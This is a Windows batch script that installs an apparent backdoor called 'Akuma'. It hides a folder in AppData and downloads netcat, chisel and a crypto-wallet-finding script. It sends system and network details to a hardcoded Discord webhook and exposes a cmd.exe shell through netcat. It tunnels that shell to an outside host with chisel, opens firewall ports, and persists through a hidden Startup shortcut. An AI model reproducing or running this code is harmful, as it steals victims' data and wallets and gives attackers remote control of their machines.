@echo off
rmdir /s /q %AppData%\Akuma
mkdir %AppData%\Akuma
attrib +h %AppData%\Akuma
mkdir %AppData%\Akuma\nc
%homedrive%
cd %homedrive%\A7uma
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %AppData%\Akuma\nc\nc.exe
curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %AppData%\Akuma\nc\libcrypto-3.dll
curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %AppData%\Akuma\chisel.exe
curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %AppData%\Akuma\WalletFinder.bat
cd %AppData%\Akuma
echo del %AppData%\Akuma\systeminfo.txt >> %AppData%\Akuma\zonbi.bat
echo systeminfo ^>^> %AppData%\Akuma\systeminfo.txt >> %AppData%\Akuma\zonbi.bat
echo ipconfig /all ^>^> %AppData%\Akuma\systeminfo.txt >> %AppData%\Akuma\zonbi.bat
echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%AppData%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1169439326988411011/KfTclOjQxXCRVbxZtpmyiePMZvF6CpqrFzAXj7-XFQukq_ZrSEa_zT4dfw3mWdwGWfGy >> %AppData%\Akuma\zonbi.bat
echo :loop >> %AppData%\Akuma\nc.bat
echo %AppData%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %AppData%\Akuma\nc.bat
echo goto loop >> %AppData%\Akuma\nc.bat
echo :loop >> %AppData%\Akuma\chisel.bat
echo %AppData%\Akuma\chisel.exe client akuma.4kum4n0d3z3r0.xyz:32101 R:%random%:localhost:32100 >> %AppData%\Akuma\chisel.bat
echo goto loop >> %AppData%\Akuma\chisel.bat
echo netsh advfirewall firewall delete rule name=".akuma" >> %AppData%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %AppData%\Akuma\network.bat
echo netsh advfirewall firewall add rule name=".akuma" dir=out action=allow protocol=TCP localport=32100-32110 >> %AppData%\Akuma\network.bat
echo Set objShell = CreateObject("WScript.Shell") >> %AppData%\Akuma\Akuma.vbs
echo objShell.Run "%AppData%\Akuma\nc.bat", 0, False >> %AppData%\Akuma\Akuma.vbs
echo objShell.Run "%AppData%\Akuma\chisel.bat", 0, False >> %AppData%\Akuma\Akuma.vbs
echo objShell.Run "%AppData%\Akuma\zonbi.bat", 0, False >> %AppData%\Akuma\Akuma.vbs
echo objShell.Run "%AppData%\Akuma\network.bat", 0, False >> %AppData%\Akuma\Akuma.vbs
echo objShell.Run "%AppData%\Akuma\WalletFinder.bat", 0, False >> %AppData%\Akuma\Akuma.vbs
echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%AppData%\Akuma\Akuma.vbs';$s.Save()"
start %AppData%\Akuma\Akuma.vbs
rmdir /s /q %homedrive%\ShiniGami
exit
